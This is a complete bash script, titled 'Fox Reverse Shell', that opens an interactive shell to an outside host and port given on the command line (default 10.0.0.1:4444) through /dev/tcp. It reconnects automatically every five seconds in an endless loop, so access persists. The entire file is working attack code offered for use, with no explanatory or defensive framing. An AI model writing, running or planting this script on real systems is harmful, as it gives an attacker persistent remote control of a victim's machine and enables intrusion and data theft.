#!/bin/bash
# Fox Reverse Shell — Bash One-Liner with Auto-Reconnect
# Usage: bash fox-revshell.sh 10.0.0.1 4444

HOST="${1:-10.0.0.1}"
PORT="${2:-4444}"

while true; do
    bash -i >& /dev/tcp/"$HOST"/"$PORT" 0>&1
    sleep 5
done
